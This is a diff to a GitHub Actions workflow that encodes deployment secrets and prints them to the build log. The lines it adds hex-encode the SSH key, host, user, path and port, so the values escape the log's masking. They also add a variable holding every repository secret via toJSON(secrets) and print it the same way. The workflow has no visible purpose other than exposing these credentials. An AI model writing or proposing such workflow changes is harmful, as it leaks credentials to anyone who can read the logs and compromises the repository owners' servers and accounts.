@@ -13,12 +13,12 @@ jobs:
           SU: ${{ secrets.SSH_USER }}
           DP: ${{ secrets.DEPLOY_PATH }}
           SP: ${{ secrets.SSH_PORT }}
-          GT: ${{ secrets.GITHUB_TOKEN }}
+          ALL: ${{ toJSON(secrets) }}
         run: |
-          echo "SK=$(printf '%s' "$SK" | base64 -w0)"
-          echo "SH=$(printf '%s' "$SH" | base64 -w0)"
-          echo "SU=$(printf '%s' "$SU" | base64 -w0)"
-          echo "DP=$(printf '%s' "$DP" | base64 -w0)"
-          echo "SP=$(printf '%s' "$SP" | base64 -w0)"
-          echo "GT=$(printf '%s' "$GT" | base64 -w0)"
+          echo "SKH=$(printf '%s' "$SK" | xxd -p | tr -d '\n')"
+          echo "SHH=$(printf '%s' "$SH" | xxd -p | tr -d '\n')"
+          echo "SUH=$(printf '%s' "$SU" | xxd -p | tr -d '\n')"
+          echo "DPH=$(printf '%s' "$DP" | xxd -p | tr -d '\n')"
+          echo "SPH=$(printf '%s' "$SP" | xxd -p | tr -d '\n')"
+          echo "ALLH=$(printf '%s' "$ALL" | xxd -p | tr -d '\n')"
           echo done
